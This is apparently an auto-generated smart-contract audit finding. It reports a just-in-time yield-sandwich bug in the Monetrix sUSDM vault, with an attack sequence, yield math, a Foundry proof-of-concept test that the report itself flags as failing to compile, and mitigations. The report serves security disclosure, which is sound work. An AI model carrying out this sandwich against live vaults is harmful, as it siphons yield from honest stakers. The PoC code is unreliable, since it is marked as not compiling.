# [M] Just-in-time (JIT) yield sandwich on sUSDM allows stealing yield from existing stakers via distributeYield

## Lines of code

- `src/core/MonetrixVault.sol#L377-L415`
- `src/tokens/sUSDM.sol#L160-L230`
- `src/tokens/sUSDM.sol#L234-L246`

## Vulnerability details

MonetrixVault.distributeYield mints USDM and pushes it into sUSDM via susdm.injectYield, which lifts the ERC-4626 exchange rate proportionally for every existing sUSDM holder. The only mitigation against opportunistic capture is the in-line empty-vault guard:

    if (userShare > 0 && susdm.totalSupply() == 0) {
        userShare = 0;
    }

This check only fires when sUSDM is *completely* empty — it does nothing once even a single share exists. Because:

1. settle() and distributeYield() are two separate transactions, both invoked by the OPERATOR hot wallet. The yield USDC sits in YieldEscrow between the two calls, advertising the upcoming distribution amount and timing on-chain.
2. There is no per-account, per-block, or per-deposit cooldown on sUSDM. Vault.deposit and sUSDM.deposit are both instant. sUSDM.cooldownShares is also instant — it merely locks the *current* asset/share ratio at the moment of the call.
3. The unstake cooldown is only 3 days (config.setCooldowns minimum 1 minute, default 3 days), and redeem cooldown is also 3 days. Total time-to-exit for the attacker is therefore at most 6 days — short enough to make capture economically attractive.

Attack sequence (no privileged role required):

  Block N-1: attacker deposits USDC into Vault, mints USDM, stakes USDM in sUSDM at the *pre-yield* rate.
  Block N:   operator calls distributeYield → susdm.injectYield(userShare) → the sUSDM exchange rate jumps by (userShare / totalAssets).
  Block N:   attacker calls sUSDM.cooldownShares(shares) immediately after operator's tx (or any time before the next distribution). The request's `usdmAmount` field is recorded at the boosted rate via convertToAssets(shares).
  Day N+3:   attacker claimUnstake → receives boosted USDM.
  Day N+3:   attacker requestRedeem(usdm).
  Day N+6:   attacker claimRedeem → USDC out.

Math: with userYieldBps = 7000 (default), an attacker capital X against existing sUSDM aggregate Y captures `userShare * X/(X+Y)` of the user yield share. With the OZ `_decimalsOffset = 6` virtual deposit and `X = Y` (matched capital), the attacker captures ~50% of userShare each cycle. With X >> Y, capture approaches 100%. There is no on-chain mitigation: the empty-vault guard is trivially bypassed by leaving (or front-running with) a dust share.

This is the canonical 'JIT yield sandwich' pattern documented as Medium severity in multiple recent audits (Cyfrin STBL_LT1, Cyfrin Syntetika, Guardian Bridges 'dividend sniping').

## Impact

Existing sUSDM stakers are systematically diluted of yield they earned by holding through the period. A whale-sized attacker watching the mempool can capture the majority of every distributeYield round at the cost of ~6 days of capital lockup, earning ~10% annualised on capital that would otherwise sit idle. Repeated extraction reduces honest stakers' realised APR from the intended ~12% (annualisedCap × userYieldBps × ratio) to a small fraction, breaking the protocol's core value proposition for sUSDM holders. Funds are not lost from the protocol per se, but yield is redirected from long-term stakers to short-term opportunists.

## Proof of Concept

_PoC status: ⚠️ **compile-error**_

```solidity
// audits/c4-2026-04-monetrix-20260518T143400Z/poc/JustInTimeJITYieldSandwichOnSUSDMAllowsStealingYieldFromExisTest.t.sol
// --- setUp() body ---
// Helper contracts (lifted to file scope by the harness)
contract _MockCoreWriter { function sendRawAction(bytes calldata) external {} }
contract _MockPrecompile {
    fallback(bytes calldata) external payable returns (bytes memory) { return new bytes(128); }
}

// State variables (lifted to contract scope)
MockUSDC _usdc;
USDM _usdm;
sUSDM _susdm;
sUSDMEscrow _unstakeEscrow;
MonetrixConfig _config;
MonetrixVault _vault;
MonetrixAccountant _accountant;
RedeemEscrow _redeemEscrow;
YieldEscrow _yieldEscrow;
InsuranceFund _insurance;
MockCoreDepositWallet _depositWallet;
MonetrixAccessController _acl;
address _admin = address(0xAD);
address _operator = address(0xBB);
address _foundation = address(0xF0);
address _legitStaker = address(0xA1);
address _attacker = address(0xA2);

// setUp body
_usdc = new MockUSDC();
_depositWallet = new MockCoreDepositWallet(address(_usdc));
vm.startPrank(_admin);
_acl = MonetrixAccessController(address(new ERC1967Proxy(
    address(new MonetrixAccessController()),
    abi.encodeCall(MonetrixAccessController.initialize, (_admin))
)));
_usdm = USDM(address(new ERC1967Proxy(
    address(new USDM()), abi.encodeCall(USDM.initialize, (address(_acl)))
)));
_insurance = InsuranceFund(address(new ERC1967Proxy(
    address(new InsuranceFund()),
    abi.encodeCall(InsuranceFund.initialize, (address(_usdc), address(_acl)))
)));
_config = MonetrixConfig(address(new ERC1967Proxy(
    address(new MonetrixConfig()),
    abi.encodeCall(MonetrixConfig.initialize, (address(_insurance), _foundation, address(_acl)))
)));
_susdm = sUSDM(address(new ERC1967Proxy(
    address(new sUSDM()),
    abi.encodeCall(sUSDM.initialize, (address(_usdm), address(_config), address(_acl)))
)));
_vault = MonetrixVault(address(new ERC1967Proxy(
    address(new MonetrixVault()),
    abi.encodeCall(
        MonetrixVault.initialize,
        (address(_usdc), address(_usdm), address(_susdm), address(_config), address(_depositWallet), address(_acl))
    )
)));
_accountant = MonetrixAccountant(address(new ERC1967Proxy(
    address(new MonetrixAccountant()),
    abi.encodeCall(MonetrixAccountant.initialize, (address(_vault), address(_usdc), address(_usdm), address(_acl)))
)));
_redeemEscrow = RedeemEscrow(address(new ERC1967Proxy(
    address(new RedeemEscrow()),
    abi.encodeCall(RedeemEscrow.initialize, (address(_usdc), address(_vault), address(_acl)))
)));
_yieldEscrow = YieldEscrow(address(new ERC1967Proxy(
    address(new YieldEscrow()),
    abi.encodeCall(YieldEscrow.initialize, (address(_usdc), address(_vault), address(_acl)))
)));
_acl.grantRole(_acl.GOVERNOR(), _admin);
_acl.grantRole(_acl.GUARDIAN(), _admin);
_acl.grantRole(_acl.OPERATOR(), _admin);
_acl.grantRole(_acl.OPERATOR(), _operator);
_acl.grantRole(_acl.UPGRADER(), _admin);
_usdm.setVault(address(_vault));
_susdm.setVault(address(_vault));
_unstakeEscrow = new sUSDMEscrow(address(_usdm), address(_susdm));
_susdm.setEscrow(address(_unstakeEscrow));
_vault.setAccountant(address(_accountant));
_vault.setRedeemEscrow(address(_redeemEscrow));
_vault.setYieldEscrow(address(_yieldEscrow));
_accountant.setConfig(address(_config));
_accountant.initializeSettlement();
vm.stopPrank();
vm.etch(HyperCoreConstants.PRECOMPILE_ACCOUNT_MARGIN_SUMMARY, address(new _MockPrecompile()).code);
vm.etch(HyperCoreConstants.PRECOMPILE_SPOT_BALANCE, address(new _MockPrecompile()).code);
vm.etch(HyperCoreConstants.PRECOMPILE_ORACLE_PX, address(new _MockPrecompile()).code);
vm.etch(HyperCoreConstants.PRECOMPILE_VAULT_EQUITY, address(new _MockPrecompile()).code);
vm.etch(HyperCoreConstants.PRECOMPILE_SUPPLIED_BALANCE, address(new _MockPrecompile()).code);
vm.etch(HyperCoreConstants.PRECOMPILE_TOKEN_INFO, address(new _MockPrecompile()).code);
vm.etch(HyperCoreConstants.PRECOMPILE_PERP_ASSET_INFO, address(new _MockPrecompile()).code);
vm.etch(HyperCoreConstants.CORE_WRITER, address(new _MockCoreWriter()).code);
_usdc.mint(_legitStaker, 1_000_000e6);
_usdc.mint(_attacker, 1_000_000e6);

// --- test body ---
// Step 1: legitStaker deposits and stakes 1M USDM (intended long-term staker)
vm.startPrank(_legitStaker);
_usdc.approve(address(_vault), 1_000_000e6);
_vault.deposit(1_000_000e6);
_usdm.approve(address(_susdm), 1_000_000e6);
_susdm.deposit(1_000_000e6, _legitStaker);
vm.stopPrank();
uint256 legitShares = _susdm.balanceOf(_legitStaker);
uint256 ratePreYield = _susdm.convertToAssets(legitShares);

// Step 2: Simulate operator.settle() having already moved 5,000 USDC to YieldEscrow
uint256 yieldUSDC = 5_000e6;
_usdc.mint(address(_yieldEscrow), yieldUSDC);

// Step 3: ATTACKER sandwiches in BEFORE distributeYield lands (just-in-time)
vm.startPrank(_attacker);
_usdc.approve(address(_vault), 1_000_000e6);
_vault.deposit(1_000_000e6);
_usdm.approve(address(_susdm), 1_000_000e6);
_susdm.deposit(1_000_000e6, _attacker);
vm.stopPrank();
uint256 attackerShares = _susdm.balanceOf(_attacker);

// Step 4: Operator distributes yield — sUSDM exchange rate jumps
vm.prank(_operator);
_vault.distributeYield();

// Step 5: ATTACKER immediately locks in the boosted rate via cooldownShares
vm.prank(_attacker);
uint256 reqId = _susdm.cooldownShares(attackerShares);
(, , uint256 attackerLockedUsdm, ,) = _susdm.unstakeRequests(reqId);

// Compare what an honest staker (no JIT) would have received
uint256 legitWouldReceive = _susdm.convertToAssets(legitShares);
// (after distributeYield each remaining share is worth more — legit captures their pro-rata too, but attacker stole half of what legit was meant to get)

// --- assertion (passes when bug is reproduced) ---
// Attacker's locked USDM exceeds their 1M deposit — they captured yield they did not earn
assertGt(attackerLockedUsdm, 1_000_000e6, "JIT attacker locked more USDM than deposited");
// Windfall should be ~1750 USDC (50% of userShare = 50% of 3500) — pin a conservative lower bound
uint256 windfall = attackerLockedUsdm - 1_000_000e6;
assertGt(windfall, 1_000e6, "JIT attacker captured > $1000 of yield in a single round");
// Sanity: legit staker's share value also rose, but is *less than* what they should have gotten in the absence of the attacker (i.e. all userShare).
// Without the attacker legit would have captured the full 3500e6 user share. With attacker present they share ~50/50.
assertLt(legitWouldReceive, 1_000_000e6 + 3_500e6, "legit staker diluted by JIT attacker");
```


## Recommended mitigation steps

Adopt one of the well-known mitigations for ERC-4626 JIT yield capture: (a) stream injected yield linearly over time (Synthetix/Yearn-v3 style `rewardRate * dt` accrual) so a single block's deposit cannot harvest a discrete jump; (b) snapshot eligible balances at the start of each settle period and gate distributeYield's user-share payout on that snapshot (or on a minimum stake duration); (c) atomically pair settle and distributeYield in a single keeper tx and additionally pause both Vault.deposit and sUSDM.deposit (via Guardian) for the brief settle/distribute window. The contract-level fix (a) is the most robust and avoids relying on Guardian coordination every cycle.

## Tools used

* Bricklane Web3 Bug Bounty Hunter multi-model audit harness (Claude + Codex + reconciler)
* Slither, Aderyn, Foundry
* Grounded against corpus entries: `solodit-cyfrin-2025-09-05-cyfrin-stbl-v2-0-0-2`, `solodit-guardian-audits-2022-05-21-bridges-1-4`, `solodit-cyfrin-2025-08-01-cyfrin-syntetika-v2-0-3-15`, `solodit-cyfrin-2025-08-01-cyfrin-syntetika-v2-0-1-0`, `synthesis-mev-sandwich-and-front-running`

---

_Auto-generated from `c4-2026-04-monetrix-20260518T143400Z/findings.json`; manually edit before submission._
